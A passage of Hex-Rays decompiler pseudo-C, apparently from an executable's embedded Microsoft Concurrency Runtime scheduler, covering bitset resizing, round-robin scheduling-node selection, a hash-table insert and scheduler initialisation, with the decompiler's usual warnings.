  return v2;
}

//----- (000000013F149918) ----------------------------------------------------
char __fastcall sub_13F149918(__int64 a1)
{
  char v1; // bp
  int v2; // er15
  __int64 v4; // r12
  __int64 v5; // rbx
  int v6; // edi
  int v7; // edx
  __int64 v8; // rcx
  __int64 v9; // r8
  int v10; // edx
  _QWORD *v11; // r8
  __int64 v12; // rcx
  unsigned __int64 v13; // rcx
  __int64 v14; // rsi
  int v15; // edi
  int v16; // edx
  __int64 v17; // rcx
  __int64 v18; // r8
  int v19; // edx
  _QWORD *v20; // r8
  __int64 v21; // rcx
  unsigned __int64 v22; // rcx
  __int64 v23; // rsi

  v1 = 0;
  v2 = 0;
  if ( *(int *)(a1 + 68) > 0 )
  {
    v4 = 0i64;
    do
    {
      v5 = *(_QWORD *)(v4 + *(_QWORD *)(a1 + 56));
      if ( v5 )
      {
        v6 = 0;
        if ( *(int *)(v5 + 144) > 0 )
        {
          while ( 1 )
          {
            v7 = v6 >> *(_DWORD *)(v5 + 116);
            if ( v7 < *(_DWORD *)(v5 + 140) )
            {
              v8 = *(int *)(v5 + 136);
              v9 = *(_QWORD *)(v5 + 128);
              if ( v7 < (int)v8 )
              {
                v11 = *(_QWORD **)(v9 + 8i64 * v7);
              }
              else
              {
                v10 = v7 - v8;
                v11 = *(_QWORD **)(v9 + 8 * v8 - 8);
                if ( v10 >= 0 )
                {
                  v12 = (unsigned int)(v10 + 1);
                  do
                  {
                    v11 = (_QWORD *)v11[1];
                    --v12;
                  }
                  while ( v12 );
                }
              }
              v13 = v6 & (unsigned __int64)(*(int *)(v5 + 112) - 1i64);
              v14 = *(_QWORD *)(*v11 + 8 * v13);
              if ( v14 )
              {
                if ( sub_13F158F64(*(_QWORD *)(*v11 + 8 * v13)) || sub_13F158F70(v14) )
                  break;
              }
            }
            if ( ++v6 >= *(_DWORD *)(v5 + 144) )
              goto LABEL_18;
          }
          v1 = 1;
        }
LABEL_18:
        if ( v1 )
          return v1;
        v15 = 0;
        if ( *(int *)(v5 + 272) > 0 )
        {
          while ( 1 )
          {
            v16 = v15 >> *(_DWORD *)(v5 + 244);
            if ( v16 < *(_DWORD *)(v5 + 268) )
            {
              v17 = *(int *)(v5 + 264);
              v18 = *(_QWORD *)(v5 + 256);
              if ( v16 < (int)v17 )
              {
                v20 = *(_QWORD **)(v18 + 8i64 * v16);
              }
              else
              {
                v19 = v16 - v17;
                v20 = *(_QWORD **)(v18 + 8 * v17 - 8);
                if ( v19 >= 0 )
                {
                  v21 = (unsigned int)(v19 + 1);
                  do
                  {
                    v20 = (_QWORD *)v20[1];
                    --v21;
                  }
                  while ( v21 );
                }
              }
              v22 = v15 & (unsigned __int64)(*(int *)(v5 + 240) - 1i64);
              v23 = *(_QWORD *)(*v20 + 8 * v22);
              if ( v23 )
              {
                if ( sub_13F158F64(*(_QWORD *)(*v20 + 8 * v22)) || sub_13F158F70(v23) )
                  break;
              }
            }
            if ( ++v15 >= *(_DWORD *)(v5 + 272) )
              goto LABEL_33;
          }
          v1 = 1;
        }
      }
LABEL_33:
      ++v2;
      v4 += 8i64;
    }
    while ( v2 < *(_DWORD *)(a1 + 68) );
  }
  return v1;
}

//----- (000000013F149AC8) ----------------------------------------------------
__int64 __fastcall sub_13F149AC8(__int64 a1)
{
  return *(_QWORD *)(sub_13F149FE4(a1) + 16);
}

//----- (000000013F149ADC) ----------------------------------------------------
__int64 __fastcall sub_13F149ADC(__int64 a1, __int64 a2, _DWORD *a3)
{
  int v6; // eax
  unsigned __int64 v7; // r9
  unsigned __int128 v8; // rax
  __int64 v9; // rax
  int *v10; // rdx
  __int64 v12; // [rsp+58h] [rbp+10h] BYREF
  unsigned int v13; // [rsp+60h] [rbp+18h] BYREF

  v12 = a2;
  v6 = sub_13F1454C8(a1, a2);
  *(_DWORD *)a2 = v6;
  v7 = (unsigned __int64)(unsigned int)(v6 + 31) >> 5;
  v8 = v7 * (unsigned __int128)4ui64;
  if ( !is_mul_ok(v7, 4ui64) )
    *(_QWORD *)&v8 = -1i64;
  v9 = sub_13F1790C4(v8, *((_QWORD *)&v8 + 1));
  *(_QWORD *)(a2 + 8) = v9;
  sub_13F15EF70(v9, 0, 4 * ((unsigned __int64)(unsigned int)(*(_DWORD *)a2 + 31) >> 5));
  switch ( *a3 & 0xFFFFFFF )
  {
    case 0:
      sub_13F149304(a2);
      return a2;
    case 1:
      v10 = (int *)(32i64 * (unsigned int)a3[2] + *(_QWORD *)(a1 + 40) + 16i64);
      goto LABEL_10;
    case 2:
      v10 = (int *)(*(_QWORD *)(*(_QWORD *)(a1 + 48) + 8i64 * (unsigned int)a3[2]) + 16i64);
LABEL_10:
      sub_13F149020((int *)a2, v10);
      return a2;
    case 3:
      LODWORD(v12) = a3[2];
      sub_13F149520((int *)(a1 + 584), &v12, &v13);
      *(_DWORD *)(*(_QWORD *)(a2 + 8) + 4 * ((unsigned __int64)v13 >> 5)) |= 1 << (v13 & 0x1F);
      break;
  }
  return a2;
}
// 13F1454C8: using guessed type __int64 __fastcall sub_13F1454C8(_QWORD, _QWORD);
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);

//----- (000000013F149BE4) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F149BE4()
{
  __int64 result; // rax
  char v1[8]; // [rsp+28h] [rbp-20h] BYREF
  int v2; // [rsp+30h] [rbp-18h]
  __int64 (__fastcall *v3)(); // [rsp+38h] [rbp-10h]
  __int64 v4; // [rsp+50h] [rbp+8h] BYREF
  int *v5; // [rsp+58h] [rbp+10h]

  v5 = &dword_13F1C5DD4;
  if ( _InterlockedExchange(&dword_13F1C5DD4, 1) )
  {
    v2 = 0;
    v3 = sub_13F142C2C;
    do
      sub_13F141BF4((__int64)v1);
    while ( _InterlockedExchange(&dword_13F1C5DD4, 1) );
  }
  sub_13F150AC4(&v4, 0i64);
  qword_13F1C5DA0 = (__int64)sub_13F149118(&v4);
  sub_13F14A304(0i64);
  (*(void (__fastcall **)(_QWORD))(MEMORY[0] + 32i64))(0i64);
  sub_13F150BB8(&v4);
  result = 0i64;
  dword_13F1C5DD4 = 0;
  return result;
}
// 13F149C78: write access to const memory at 13F1C5DA0 has been detected
// 13F149CAD: write access to const memory at 13F1C5DD4 has been detected
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5DA0: using guessed type __int64 qword_13F1C5DA0;
// 13F1C5DD4: using guessed type int dword_13F1C5DD4;
// 13F149BE4: using guessed type char var_20[8];

//----- (000000013F149CBC) ----------------------------------------------------
_QWORD *__fastcall sub_13F149CBC(__int64 a1, char a2)
{
  __int64 v4; // rax
  __int64 v5; // r8
  __int64 v6; // rax
  __int64 v7; // rbx
  _QWORD *v8; // rax

  v4 = MEMORY[0x771DAED0](a1 + 768);
  v5 = v4 - 16;
  v6 = -v4;
  v7 = v5 & -(__int64)(v6 != 0);
  if ( v7 )
  {
    sub_13F15A358(v5 & -(__int64)(v6 != 0), a2);
  }
  else
  {
    v8 = (_QWORD *)sub_13F14059C(288i64);
    if ( v8 )
      return sub_13F15A004(v8, a1, a2);
  }
  return (_QWORD *)v7;
}

//----- (000000013F149D3C) ----------------------------------------------------
__int64 __fastcall sub_13F149D3C(__int64 a1, char a2)
{
  char v2; // bl
  __int64 v4; // rax
  __int64 result; // rax
  unsigned int v6; // esi
  __int64 v7; // rax
  __int64 v8; // rbx

  v2 = a2;
  if ( a2 )
  {
    if ( (*(unsigned __int8 (__fastcall **)(__int64))(*(_QWORD *)a1 + 176i64))(a1) )
    {
      v4 = MEMORY[0x771DAED0](a1 + 800);
      result = (v4 - 32) & -(__int64)(v4 != 0);
      if ( result )
        return result;
    }
    v6 = sub_13F14C304(a1, 1);
    if ( v6 )
    {
      if ( (unsigned int)sub_13F1426A8(a1) - *(_DWORD *)(a1 + 704) < v6 )
        return 0i64;
      v2 = 0;
    }
  }
  _InterlockedIncrement((volatile signed __int32 *)(a1 + 632));
  if ( !v2 )
    *(_QWORD *)(a1 + 704) = sub_13F1426A8(a1);
  v7 = MEMORY[0x771DAED0](a1 + 752);
  v8 = (v7 - 32) & -(__int64)(v7 != 0);
  if ( !v8 )
  {
    v8 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a1 + 128i64))(a1);
    sub_13F148644(a1, v8);
    _InterlockedIncrement((volatile signed __int32 *)(a1 + 624));
  }
  sub_13F157088(v8);
  *(_QWORD *)(v8 + 256) = 0i64;
  (*(void (__fastcall **)(_QWORD, __int64))(**(_QWORD **)(a1 + 664) + 16i64))(*(_QWORD *)(a1 + 664), v8);
  if ( v8 )
  {
    *(_DWORD *)(v8 + 52) = 0;
    *(_DWORD *)(v8 + 56) = 0;
  }
  return v8;
}
// 13F149D3C: could not find valid save-restore pair for rbp
// 13F149DA8: variable 'a1' is possibly undefined
// 13F1426A8: using guessed type __int64 __fastcall sub_13F1426A8(_QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F149E78) ----------------------------------------------------
__int64 __fastcall sub_13F149E78(__int64 a1)
{
  return (unsigned int)_InterlockedIncrement((volatile signed __int32 *)(a1 + 544));
}

//----- (000000013F149E88) ----------------------------------------------------
__int64 __fastcall sub_13F149E88(__int64 a1)
{
  return (unsigned int)_InterlockedIncrement((volatile signed __int32 *)(a1 + 548));
}

//----- (000000013F149E98) ----------------------------------------------------
__int64 sub_13F149E98()
{
  return (unsigned int)_InterlockedIncrement(&dword_13F1C5DB4);
}
// 13F1C5DB4: using guessed type int dword_13F1C5DB4;

//----- (000000013F149EA8) ----------------------------------------------------
__int64 __fastcall sub_13F149EA8(__int64 a1)
{
  __int64 v1; // rsi
  __int64 v3; // rdx
  __int64 v4; // rbx

  v1 = a1 + 512;
  sub_13F141A20((volatile signed __int32 *)(a1 + 512));
  v3 = *(_QWORD *)(a1 + 504);
  if ( v3 )
  {
    v4 = *(_QWORD *)(v3 + 8);
    if ( v3 == v4 )
    {
      *(_QWORD *)(a1 + 504) = 0i64;
    }
    else
    {
      *(_QWORD *)(*(_QWORD *)(v4 + 8) + 16i64) = v3;
      *(_QWORD *)(*(_QWORD *)(a1 + 504) + 8i64) = *(_QWORD *)(v4 + 8);
    }
    if ( v4 )
      *(_DWORD *)(v4 + 24) = 1;
  }
  else
  {
    v4 = 0i64;
  }
  sub_13F141BE8(v1);
  return v4;
}

//----- (000000013F149F2C) ----------------------------------------------------
__int64 __fastcall sub_13F149F2C(__int64 a1, _DWORD *a2, int a3, __int64 a4)
{
  int v5; // eax
  __int64 v9; // rcx

  v5 = *a2 + 1;
  if ( v5 <= a3 )
    return sub_13F149668(a1, v5, a3, a2, a4);
  v9 = sub_13F149668(a1, v5, *(_DWORD *)(a4 + 112), a2, a4);
  v5 = 0;
  if ( !v9 )
    return sub_13F149668(a1, v5, a3, a2, a4);
  return v9;
}

//----- (000000013F149FA4) ----------------------------------------------------
__int64 __fastcall sub_13F149FA4(__int64 a1, __int64 a2, __int64 a3)
{
  int v4; // edx
  __int64 v5; // r9
  __int64 v6; // rcx

  v4 = *(_DWORD *)(a3 + 296);
  v5 = 0i64;
  do
    v4 = (v4 + 1) % *(_DWORD *)(a1 + 68);
  while ( !*(_DWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 56) + 8i64 * v4) + 300i64) );
  v6 = *(_QWORD *)(a1 + 56);
  if ( *(_QWORD *)(v6 + 8i64 * v4) != a2 )
    return *(_QWORD *)(v6 + 8i64 * v4);
  return v5;
}

//----- (000000013F149FE4) ----------------------------------------------------
__int64 __fastcall sub_13F149FE4(__int64 a1)
{
  __int64 v1; // rdx
  __int64 v2; // r10

  v1 = *(unsigned int *)(a1 + 604);
  v2 = *(_QWORD *)(*(_QWORD *)(a1 + 56) + 8 * v1);
  do
    LODWORD(v1) = ((int)v1 + 1) % *(_DWORD *)(a1 + 68);
  while ( !*(_DWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 56) + 8i64 * (int)v1) + 300i64) );
  *(_DWORD *)(a1 + 604) = v1;
  return v2;
}

//----- (000000013F14A020) ----------------------------------------------------
__int64 *__fastcall sub_13F14A020(__int64 a1, __int64 *a2)
{
  sub_13F150A7C(a2, (_OWORD **)(a1 + 8));
  return a2;
}

//----- (000000013F14A040) ----------------------------------------------------
_QWORD *__fastcall sub_13F14A040(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v5; // rax
  _QWORD *result; // rax

  v5 = MEMORY[0x771DAED0](a1 + 784);
  result = (_QWORD *)((v5 - 32) & -(__int64)(v5 != 0));
  if ( !result )
  {
    result = (_QWORD *)sub_13F14059C(48i64);
    if ( !result )
      return result;
    *result = off_13F18A5E8;
  }
  result[4] = 0i64;
  result[2] = a3;
  result[1] = a2;
  return result;
}
// 13F18A5E8: using guessed type __int64 (__fastcall *off_13F18A5E8[2])();

//----- (000000013F14A0A4) ----------------------------------------------------
__int64 __fastcall sub_13F14A0A4(__int64 a1)
{
  volatile __int32 *v1; // rcx

  v1 = (volatile __int32 *)(a1 + 496);
  if ( *(_QWORD *)v1 )
    return sub_13F149194(v1);
  else
    return 0i64;
}

//----- (000000013F14A0BC) ----------------------------------------------------
__int64 __fastcall sub_13F14A0BC(char a1)
{
  __int64 v2; // rbx
  __int64 v3; // rax

  if ( a1 )
    _InterlockedIncrement(&dword_13F1C5DBC);
  v2 = MEMORY[0x771DAED0](qword_13F1C5DE0);
  if ( !v2 )
  {
    v3 = sub_13F14059C(1568i64);
    v2 = v3;
    if ( v3 )
    {
      sub_13F141160(v3 + 16, 16i64, 96i64);
      *(_BYTE *)(v2 + 1552) = 0;
    }
    else
    {
      v2 = 0i64;
    }
  }
  *(_BYTE *)(v2 + 1552) = a1;
  return v2;
}
// 13F1C5DBC: using guessed type int dword_13F1C5DBC;
// 13F1C5DE0: using guessed type __int64 qword_13F1C5DE0[2];

//----- (000000013F14A160) ----------------------------------------------------
__int64 __fastcall sub_13F14A160(__int64 a1, int a2)
{
  __int64 v2; // r8
  int i; // eax

  LODWORD(v2) = a2;
  for ( i = *(_DWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 56) + 8i64 * a2) + 300i64);
        !i;
        i = *(_DWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 56) + 8 * v2) + 300i64) )
  {
    v2 = ((int)v2 + 1) % *(_DWORD *)(a1 + 68);
  }
  return (unsigned int)v2;
}

//----- (000000013F14A198) ----------------------------------------------------
void __fastcall sub_13F14A198(__int64 a1, int a2)
{
  unsigned int v4; // esi
  unsigned __int128 v5; // rax
  __int64 v6; // rax
  __int64 v7; // r8
  __int64 v8; // r14
  __int64 v9; // rdx
  __int64 v10; // r9
  __int64 v11; // rdx

  if ( a2 != *(_DWORD *)a1 )
  {
    v4 = (unsigned int)(a2 + 31) >> 5;
    v5 = v4 * (unsigned __int128)4ui64;
    if ( !is_mul_ok(v4, 4ui64) )
      *(_QWORD *)&v5 = -1i64;
    v6 = sub_13F1790C4(v5, *((_QWORD *)&v5 + 1));
    v7 = 0i64;
    v8 = v6;
    v9 = (unsigned int)(*(_DWORD *)a1 + 31) >> 5;
    if ( (_DWORD)v9 )
    {
      v10 = (unsigned int)v9;
      do
      {
        *(_DWORD *)(v7 + v6) = *(_DWORD *)(v7 + *(_QWORD *)(a1 + 8));
        v7 += 4i64;
        --v10;
      }
      while ( v10 );
    }
    sub_13F15EF70(v6 + 4 * v9, 0, 4i64 * (v4 - (unsigned int)v9));
    sub_13F14088C(*(_QWORD *)(a1 + 8), v11);
    *(_QWORD *)(a1 + 8) = v8;
    *(_DWORD *)a1 = a2;
  }
}
// 13F14A21D: variable 'v11' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);

//----- (000000013F14A240) ----------------------------------------------------
void __fastcall sub_13F14A240(unsigned int *a1, unsigned int a2)
{
  __int64 v2; // rdi
  unsigned __int64 v4; // rbx
  unsigned __int128 v5; // rax
  __int64 v6; // rax
  __int64 v7; // r9
  __int64 v8; // r14
  _DWORD *v9; // r8
  __int64 v10; // rax
  int v11; // edx
  __int64 v12; // rdx

  v2 = *a1;
  v4 = a2;
  if ( a2 != (_DWORD)v2 )
  {
    sub_13F14A198((__int64)a1, a2);
    v5 = v4 * (unsigned __int128)4ui64;
    if ( !is_mul_ok(v4, 4ui64) )
      *(_QWORD *)&v5 = -1i64;
    v6 = sub_13F1790C4(v5, *((_QWORD *)&v5 + 1));
    v7 = 0i64;
    v8 = v6;
    if ( (_DWORD)v2 )
    {
      v9 = (_DWORD *)v6;
      v10 = (unsigned int)v2;
      do
      {
        v11 = *(_DWORD *)(v7 + *((_QWORD *)a1 + 2));
        v7 += 4i64;
        *v9++ = v11;
        --v10;
      }
      while ( v10 );
    }
    sub_13F15EF70(v8 + 4 * v2, 0, 4i64 * (unsigned int)(v4 - v2));
    sub_13F14088C(*((_QWORD *)a1 + 2), v12);
    *((_QWORD *)a1 + 2) = v8;
  }
}
// 13F14A2C2: variable 'v12' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);

//----- (000000013F14A2E4) ----------------------------------------------------
bool __fastcall sub_13F14A2E4(__int64 a1)
{
  return (*(_DWORD *)(a1 + 636) & 0xA0000000) == -1610612736;
}

//----- (000000013F14A2FC) ----------------------------------------------------
__int64 __fastcall sub_13F14A2FC(__int64 a1)
{
  return *(unsigned int *)(a1 + 600);
}

//----- (000000013F14A304) ----------------------------------------------------
void __fastcall sub_13F14A304(__int64 a1)
{
  __int64 v1; // rsi
  __int64 v2; // rcx
  int v3; // eax
  __int64 v4; // rbx
  unsigned __int128 v5; // rax
  unsigned __int64 v6; // kr00_8
  bool v7; // cf
  __int64 *v8; // rax
  _QWORD *v9; // rdi
  unsigned __int64 v10; // rcx
  unsigned __int128 v11; // rax
  unsigned __int64 v12; // rcx
  unsigned __int128 v13; // rax
  __int64 v14; // rax
  unsigned int v15; // edi
  __int64 v16; // rdx
  __int64 v17; // rcx
  int v18; // er15
  int i; // er14
  __int64 v20; // rbx
  __int64 v21; // rbx
  unsigned __int64 v22; // r12
  unsigned __int128 v23; // rax
  unsigned int v24; // eax
  __int64 v25; // r13
  __int64 v26; // rcx
  __int64 v27; // r15
  __int64 v28; // r14
  __int64 v29; // rbx
  int v30; // er9
  unsigned __int64 v31; // r8
  __int64 v32; // rdx
  __int64 v33; // rax
  __int64 *v34; // r13
  __int64 v35; // rax
  __int64 v36; // r14
  int v37; // esi
  __int64 v38; // rcx
  __int64 v39; // rdx
  unsigned int v40; // edi
  __int64 v41; // rbx
  unsigned __int128 v42; // rax
  __int64 v43; // rcx
  __int64 v44; // rdi
  __int64 (__fastcall *v45)(__int64, __int64, __int64); // rbx
  __int64 v46; // rax
  void (__fastcall ***v47)(_QWORD, _QWORD); // rax
  __int64 v48; // rax
  int v49; // eax
  int v50; // edx
  unsigned int v51; // [rsp+30h] [rbp-79h]
  int v52; // [rsp+34h] [rbp-75h]
  int v53; // [rsp+38h] [rbp-71h] BYREF
  int v54; // [rsp+40h] [rbp-69h] BYREF
  int v55; // [rsp+48h] [rbp-61h]
  unsigned __int64 v56; // [rsp+50h] [rbp-59h]
  __int64 v57; // [rsp+58h] [rbp-51h]
  __int64 v58; // [rsp+60h] [rbp-49h]
  int v59; // [rsp+68h] [rbp-41h] BYREF
  __int64 v60; // [rsp+70h] [rbp-39h]
  __int64 v61; // [rsp+78h] [rbp-31h]
  __int64 v62; // [rsp+80h] [rbp-29h]
  __int64 v63; // [rsp+88h] [rbp-21h]
  __int64 v64; // [rsp+90h] [rbp-19h]
  char pExceptionObject[104]; // [rsp+98h] [rbp-11h] BYREF
  int v67; // [rsp+118h] [rbp+6Fh] BYREF
  __int64 v68; // [rsp+120h] [rbp+77h] BYREF
  unsigned int v69; // [rsp+128h] [rbp+7Fh] BYREF

  v62 = -2i64;
  v1 = a1;
  *(_DWORD *)(a1 + 676) = 0;
  *(_DWORD *)(a1 + 28) = 0;
  *(_DWORD *)(a1 + 68) = 0;
  *(_QWORD *)(a1 + 656) = sub_13F1438C8();
  *(_DWORD *)(v1 + 600) = sub_13F1454D8();
  *(_DWORD *)(v1 + 68) = sub_13F1454D0(v2);
  v3 = sub_13F1425E8() + 1;
  *(_DWORD *)(v1 + 64) = v3;
  v4 = v3;
  v68 = v3;
  v6 = v3;
  v5 = (unsigned __int64)v3 * (unsigned __int128)0x20u;
  if ( !is_mul_ok(v6, 0x20ui64) )
    *(_QWORD *)&v5 = -1i64;
  v7 = __CFADD__((_QWORD)v5, 8i64);
  *(_QWORD *)&v5 = v5 + 8;
  if ( v7 )
    *(_QWORD *)&v5 = -1i64;
  v8 = (__int64 *)sub_13F1790C4(v5, *((_QWORD *)&v5 + 1));
  v58 = (__int64)v8;
  if ( v8 )
  {
    *v8 = v4;
    v9 = v8 + 1;
    sub_13F141160((__int64)(v8 + 1), 32i64, v4);
  }
  else
  {
    v9 = 0i64;
  }
  *(_QWORD *)(v1 + 40) = v9;
  v10 = *(int *)(v1 + 68);
  v11 = v10 * (unsigned __int128)8u;
  if ( !is_mul_ok(v10, 8ui64) )
    *(_QWORD *)&v11 = -1i64;
  *(_QWORD *)(v1 + 56) = sub_13F1790C4(v11, *((_QWORD *)&v11 + 1));
  v12 = *(int *)(v1 + 68);
  v13 = v12 * (unsigned __int128)8u;
  if ( !is_mul_ok(v12, 8ui64) )
    *(_QWORD *)&v13 = -1i64;
  *(_QWORD *)(v1 + 48) = sub_13F1790C4(v13, *((_QWORD *)&v13 + 1));
  sub_13F15EF70(*(_QWORD *)(v1 + 56), 0, 8i64 * *(int *)(v1 + 68));
  sub_13F15EF70(*(_QWORD *)(v1 + 48), 0, 8i64 * *(int *)(v1 + 68));
  v14 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v1 + 72i64))(v1);
  *(_QWORD *)(v1 + 304) = v14;
  *(_BYTE *)(v14 + 80) |= 4u;
  v15 = 0;
  LODWORD(v68) = 0;
  v18 = sub_13F1454C8(v17, v16);
  v55 = v18;
  for ( i = 0; i < *(_DWORD *)(v1 + 64); ++i )
  {
    v20 = 32i64 * i;
    sub_13F14A198(v20 + *(_QWORD *)(v1 + 40), *(_DWORD *)(v1 + 68));
    sub_13F14A198(v20 + *(_QWORD *)(v1 + 40) + 16i64, v18);
  }
  v21 = (*(__int64 (__fastcall **)(_QWORD))(**(_QWORD **)(v1 + 656) + 32i64))(*(_QWORD *)(v1 + 656));
  v57 = v21;
  if ( v21 )
  {
    v22 = (unsigned __int64)(unsigned int)(v18 + 31) >> 5;
    v56 = v22;
    do
    {
      v59 = v18;
      v23 = v22 * (unsigned __int128)4ui64;
      if ( !is_mul_ok(v22, 4ui64) )
        *(_QWORD *)&v23 = -1i64;
      v60 = sub_13F1790C4(v23, *((_QWORD *)&v23 + 1));
      sub_13F15EF70(v60, 0, 4 * ((unsigned __int64)(unsigned int)(v59 + 31) >> 5));
      v24 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v21 + 8i64))(v21);
      v25 = v24;
      v69 = v24;
      v51 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v21 + 16i64))(v21);
      v61 = 32i64 * v51;
      v26 = *(_QWORD *)(v1 + 40);
      v58 = v25;
      *(_DWORD *)(*(_QWORD *)(v61 + v26 + 8) + 4 * ((unsigned __int64)(unsigned int)v25 >> 5)) |= 1 << (v25 & 0x1F);
      v52 = v15;
      v27 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v21 + 32i64))(v21);
      v28 = v27;
      if ( v27 )
      {
        v29 = v61;
        do
        {
          v67 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v28 + 8i64))(v28);
          sub_13F14A888((int *)(v1 + 568), &v67, &v69);
          sub_13F14A888((int *)(v1 + 584), &v67, &v68);
          v30 = 1 << (v15 & 0x1F);
          v31 = (unsigned __int64)v15 >> 5;
          *(_DWORD *)(v60 + 4 * v31) |= v30;
          v32 = *(_QWORD *)(v29 + *(_QWORD *)(v1 + 40) + 24);
          *(_DWORD *)(v32 + 4 * v31) |= v30;
          LODWORD(v68) = ++v15;
          v28 = (**(__int64 (__fastcall ***)(__int64))v28)(v28);
        }
        while ( v28 );
        v21 = v57;
        v22 = v56;
        LODWORD(v25) = v69;
      }
      v33 = sub_13F14059C(304i64);
      v63 = v33;
      if ( v33 )
        v34 = (__int64 *)sub_13F157ACC(v33, v1, v25);
      else
        v34 = 0i64;
      v35 = sub_13F14059C(208i64);
      v64 = v35;
      if ( v35 )
        v36 = sub_13F155334(v35, &v59, v51, v34);
      else
        v36 = 0i64;
      v34[1] = v36;
      if ( v27 )
      {
        v37 = v52;
        do
        {
          v53 = v37;
          v54 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v27 + 8i64))(v27);
          sub_13F14A888((int *)(v36 + 32), &v54, &v53);
          ++v37;
          v27 = (**(__int64 (__fastcall ***)(__int64))v27)(v27);
        }
        while ( v27 );
        v1 = a1;
        v22 = v56;
      }
      v38 = v58;
      *(_QWORD *)(*(_QWORD *)(v1 + 56) + 8 * v58) = v34;
      *(_QWORD *)(*(_QWORD *)(v1 + 48) + 8 * v38) = v36;
      v21 = (**(__int64 (__fastcall ***)(__int64))v21)(v21);
      v57 = v21;
      sub_13F14088C(v60, v39);
      v18 = v55;
    }
    while ( v21 );
  }
  sub_13F14A240((unsigned int *)(v1 + 96), v15);
  sub_13F14A240((unsigned int *)(v1 + 120), v15);
  sub_13F14A198(v1 + 144, v15);
  sub_13F14A240((unsigned int *)(v1 + 72), v15);
  v40 = 16 * v15;
  v41 = v40;
  v42 = v40 * (unsigned __int128)8ui64;
  if ( !is_mul_ok(v40, 8ui64) )
    *(_QWORD *)&v42 = -1i64;
  *(_QWORD *)(v1 + 160) = sub_13F1790C4(v42, *((_QWORD *)&v42 + 1));
  if ( v40 )
  {
    v43 = 0i64;
    do
    {
      *(_QWORD *)(v43 + *(_QWORD *)(v1 + 160)) = 0i64;
      v43 += 8i64;
      --v41;
    }
    while ( v41 );
  }
  v44 = *(_QWORD *)(v1 + 656);
  v45 = *(__int64 (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)v44 + 16i64);
  v46 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v1 + 104i64))(v1);
  v47 = (void (__fastcall ***)(_QWORD, _QWORD))v45(v44, v46, 0x10000i64);
  *(_QWORD *)(v1 + 664) = v47;
  (**v47)(v47, 0i64);
  *(_DWORD *)(v1 + 604) = sub_13F14A160(v1, 0);
  v48 = sub_13F10A978(0i64, 0i64, 0x7FFFFFFFi64, 0i64, 0, 2031619);
  *(_QWORD *)(v1 + 608) = v48;
  if ( !v48 )
  {
    v49 = MEMORY[0x76F91760]();
    v50 = (unsigned __int16)v49 | 0x80070000;
    if ( v49 <= 0 )
      v50 = v49;
    sub_13F142E40((__int64)pExceptionObject, v50);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  (*(void (__fastcall **)(__int64))(*(_QWORD *)v1 + 152i64))(v1);
}
// 13F14A830: conditional instruction was optimized away because r12.1==0
// 13F14A355: variable 'v2' is possibly undefined
// 13F14A44C: variable 'v17' is possibly undefined
// 13F14A44C: variable 'v16' is possibly undefined
// 13F14A6E9: variable 'v39' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F1438C8: using guessed type __int64 sub_13F1438C8(void);
// 13F1454C8: using guessed type __int64 __fastcall sub_13F1454C8(_QWORD, _QWORD);
// 13F1454D0: using guessed type __int64 __fastcall sub_13F1454D0(_QWORD);
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5EB8: using guessed type int dword_13F1C5EB8;
// 13F1C5EBC: using guessed type char byte_13F1C5EBC;

//----- (000000013F14A880) ----------------------------------------------------
void __fastcall sub_13F14A880(__int64 a1)
{
  _InterlockedIncrement((volatile signed __int32 *)(a1 + 624));
}

//----- (000000013F14A888) ----------------------------------------------------
_QWORD *__fastcall sub_13F14A888(int *a1, _DWORD *a2, _DWORD *a3)
{
  unsigned __int64 v5; // rcx
  unsigned __int64 v7; // r9
  __int64 v8; // rax
  __int64 v9; // rsi
  __int64 *v10; // rcx
  __int64 v11; // rax
  _QWORD *v12; // r8
  _QWORD *result; // rax

  v5 = 0i64;
  v7 = 0xCBF29CE484222325ui64;
  do
  {
    v8 = *((unsigned __int8 *)a2 + v5++);
    v7 = 0x100000001B3i64 * (v8 ^ v7);
  }
  while ( v5 < 4 );
  v9 = (int)(v7 % *a1);
  v10 = *(__int64 **)(*((_QWORD *)a1 + 1) + 8 * v9);
  if ( v10 )
  {
    while ( *((_DWORD *)v10 + 2) != *a2 )
    {
      v10 = (__int64 *)*v10;
      if ( !v10 )
        goto LABEL_6;
    }
  }
  else
  {
LABEL_6:
    v10 = 0i64;
  }
  if ( v10 )
    return 0i64;
  v11 = sub_13F14059C(16i64);
  v12 = (_QWORD *)v11;
  if ( v11 )
  {
    *(_QWORD *)v11 = 0i64;
    *(_DWORD *)(v11 + 8) = *a2;
    *(_DWORD *)(v11 + 12) = *a3;
  }
  else
  {
    v12 = 0i64;
  }
  result = v12;
